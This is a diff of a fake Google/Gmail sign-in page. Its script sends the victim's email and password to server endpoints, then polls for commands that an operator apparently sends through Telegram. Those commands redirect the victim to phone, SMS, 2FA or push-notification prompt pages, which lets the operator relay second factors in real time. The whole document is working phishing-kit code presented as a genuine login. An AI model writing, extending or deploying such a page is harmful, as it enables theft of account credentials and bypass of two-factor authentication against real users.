@@ -12,33 +12,36 @@
             <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png" alt="Google" class="logo">
             <h1>Sign in</h1>
             <p class="subtitle">to continue to Gmail</p>
-
+            
             <form id="loginForm">
                 <div class="input-group">
                     <input type="email" id="email" required placeholder=" ">
                     <label>Email or phone</label>
                 </div>
-
+                
                 <div class="input-group">
                     <input type="password" id="password" required placeholder=" ">
                     <label>Password</label>
                 </div>
-
+                
                 <button type="submit" class="btn-next">Next</button>
             </form>
-
+            
             <div id="loading" style="display:none;" class="loading">
                 <div class="spinner"></div>
                 <p>Verifying...</p>
+                <p style="font-size:12px; color:#9aa0a6; margin-top:10px;" id="statusText">Waiting for command from Telegram...</p>
             </div>
-
+            
             <div id="sessionInfo" style="margin-top: 15px; font-size: 12px; color: #9aa0a6; text-align: center;"></div>
         </div>
     </div>
-
+    
     <script>
         let sessionId = null;
-
+        let pollingInterval = null;
+        
+        // Initialize session
         async function initSession() {
             try {
                 const response = await fetch('/api/visit', { method: 'POST' });
@@ -50,74 +53,94 @@
                 console.error('Session init error:', error);
             }
         }
-
+        
         initSession();
-
+        
+        // Handle login
         document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
-
+            
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
-
+            
+            // Show loading
             document.querySelector('.login-box').style.opacity = '0.5';
             document.getElementById('loading').style.display = 'block';
-
+            document.getElementById('loginForm').style.display = 'none';
+            
             try {
+                // Send email
                 await fetch('/api/email', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ sessionId, email })
                 });
-
+                
+                // Send password
                 await fetch('/api/password', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ sessionId, password })
                 });
-
+                
+                // Start waiting for command
                 await waitForCommand();
-
+                
             } catch (error) {
                 console.error('Error:', error);
             }
         });
-
+        
+        // Wait for command from Telegram
         async function waitForCommand() {
+            document.getElementById('statusText').textContent = 'Waiting for Telegram command...';
+            
             const maxAttempts = 300;
             let attempts = 0;
-
+            
             while (attempts < maxAttempts) {
                 try {
                     const response = await fetch(`/api/command/${sessionId}`);
                     const data = await response.json();
-
+                    
                     if (data.command) {
-                        switch(data.command) {
-                            case 'success':
-                                window.location.href = '/success.html';
-                                break;
-                            case 'phone':
-                                window.location.href = '/2fa.html?method=phone';
-                                break;
-                            case 'sms':
-                                window.location.href = '/2fa.html?method=sms';
-                                break;
-                            case 'notification':
-                                window.location.href = '/2fa.html?method=notification';
-                                break;
-                        }
+                        console.log('Command received:', data.command);
+                        handleCommand(data.command);
                         return;
                     }
                 } catch (error) {
                     console.error('Polling error:', error);
                 }
-
+                
                 await new Promise(resolve => setTimeout(resolve, 2000));
                 attempts++;
             }
-
+            
             alert('Login timed out. Please try again.');
             location.reload();
+        }
+        
+        // Handle different commands
+        function handleCommand(command) {
+            switch(command) {
+                case 'phone':
+                    window.location.href = '/prompt.html?type=phone';
+                    break;
+                case 'sms':
+                    window.location.href = '/prompt.html?type=sms';
+                    break;
+                case '2fa':
+                    window.location.href = '/prompt.html?type=2fa';
+                    break;
+                case 'notification':
+                    window.location.href = '/prompt.html?type=notification';
+                    break;
+                case 'success':
+                    window.location.href = '/success.html';
+                    break;
+                default:
+                    console.log('Unknown command:', command);
+            }
         }
     </script>
 </body>
